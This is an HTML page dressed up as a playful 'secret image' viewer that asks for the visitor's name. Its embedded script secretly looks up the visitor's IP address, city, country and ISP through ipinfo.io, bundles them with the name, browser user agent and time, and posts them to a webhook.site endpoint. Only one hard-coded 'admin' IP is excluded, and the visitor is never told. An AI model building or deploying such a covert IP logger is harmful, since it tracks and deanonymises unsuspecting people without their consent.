<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <style>
        body {
            font-family: Comic Sans MS, cursive;
            text-align: center;
            background-color: #ffe6f2;
            padding: 20px;
        }
        #content {
            max-width: 800px;
            margin: 0 auto;
        }
        #user-image {
            max-width: 100%;
            border-radius: 8px;
            display: none;
            box-shadow: 0 0 15px hotpink;
        }
        #name-form {
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div id="content">
        <h1>âœ¨ View Our Super Cute Secret Image âœ¨</h1>
        
        <div id="name-form">
            <p>Enter your name to unlock the cuteness:</p>
            <input type="text" id="userName" placeholder="UwU what's your name?">
            <button onclick="handleSubmission()">Show me ðŸ’–</button>
        </div>
        
        <img id="user-image" src="https://i.imgur.com/TMqC1JF.png" alt="UwU E-Girl + Furry Combo">
    </div>

    <script>
        const ADMIN_IP = "83.105.112.217";

        async function handleSubmission() {
            const userName = document.getElementById('userName').value.trim() || "UwU Nobody";

            try {
                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
                const userAgent = navigator.userAgent;

                const log = {
                    name: userName,
                    ip: ipData.ip,
                    city: ipData.city,
                    country: ipData.country,
                    isp: ipData.org,
                    userAgent,
                    time: new Date().toISOString()
                };

                // If viewer isn't admin, send log via webhook (or replace this later)
                if (ipData.ip !== ADMIN_IP) {
                    fetch("https://webhook.site/a75cc371-47c5-4513-aaff-5282696bb856", {
                        method: "POST",
                        body: JSON.stringify(log),
                        headers: { "Content-Type": "application/json" }
                    });
                }

                document.getElementById('user-image').style.display = 'block';
                document.getElementById('name-form').style.display = 'none';

            } catch (e) {
                document.getElementById('user-image').style.display = 'block';
                document.getElementById('name-form').style.display = 'none';
            }
        }

        document.getElementById('userName').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') handleSubmission();
        });
    </script>
</body>
</html>
